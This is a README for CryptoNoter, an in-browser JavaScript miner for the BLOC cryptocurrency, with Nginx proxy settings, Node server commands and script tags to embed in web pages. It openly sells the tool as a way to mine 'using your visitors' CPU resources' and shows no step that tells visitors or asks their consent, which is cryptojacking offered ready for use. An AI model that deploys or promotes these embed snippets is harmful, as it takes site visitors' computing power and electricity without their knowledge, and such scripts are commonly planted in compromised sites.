CryptoNoter In-Browser Javascript Web Miner===========================================CryptoNoter Web Miner supports mining for BLOC. This is the code that runs on https://bloc-mining.com/## Info* folder `haven_web_hash` is the C source code of the webminer* folder `proxy-server` is the NodeJs source code for the proxy server script## Requirements* NodeJs (tested with 8.9.4)* NodeJs Forever package (for high availability proxy server)* Nginx* Ubuntu OS (tested with 16.04.3)* SSL support for domain (optional). Use https://certbot.eff.org/## ImportantThis is a Nginx Reverse Proxy server setup, YOU NEED TO ADD THE FOLLOWING TO YOUR NGINX.CONF file under the domain. Without the following configuration, it will not work.```html   location /proxy {    	add_header 'Access-Control-Allow-Origin' * always;  	proxy_pass http://localhost:7777;        proxy_http_version 1.1;        proxy_set_header Upgrade $http_upgrade;        proxy_set_header Connection "upgrade";      }```## Usage`/srv/CryptoNoter` refers to `haven_web_hash` folder* Run CryptoNoter server.js script```bashforever start /srv/CryptoNoter/server.js```* Make sure CryptoNoter server.js script is running on the server by using the command `forever list````bashinfo:    Forever processes runningdata:        uid  command       script                     forever pid  id logfile                 uptimedata:    [0] tX4L /usr/bin/node /srv/CryptoNoter/server.js 7379    7385    /root/.forever/tX4L.log 0:0:59:11.96```* Make sure you have uploaded the `web` folder to your domain public_html or domain root. Ensure you can access https://YOUR_DOMAIN_NAME/demo.html* Change the settings for these files: worker.js, processor.js & lib/cryptonight-asmjs.min.js<br />Replace %CryptoNoter_domain% with your DOMAIN_NAME in the 3 files. Including the following codes:```htmlself.CryptoNoter = self.CryptoNoter || {};self.CryptoNoter.CONFIG = {    LIB_URL: "https://%CryptoNoter_domain%/lib/",    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]],    CAPTCHA_URL: "https://%CryptoNoter_domain%/captcha/",    MINER_URL: "https://%CryptoNoter_domain%/media/miner.html"};```* Add the following javascript before the `</head>` tag onto webpages that you want the miner to run on. Remember to replace www.cryptonoter.com with your domain name. Else, you will be mining for my wallet```html<script src="https://www.cryptonoter.com/processor.js"></script><script>    var miner = new CryptoNoter.User('CryptoNoter').start();</script>```* Done! You can now start mining using your visitors' CPU resources by adding the above tag to any of your websites.Here are some basic configuration for the parameters:```html<script src="https://www.cryptonoter.com/processor.js"></script><script>	var addr = 'CryptoNoter';	var miner = new CryptoNoter.User(addr, {        autoThreads: true,	throttle: 0.8	});	miner.start();</script>```## Credits* the `proxy-server` was originally available here https://github.com/cryptonoter/CryptoNoter.git (now defunct)* the `haven_web_hash` was originally taken from monero web miner and modified by [fireice](https://github.com/fireice-uk)
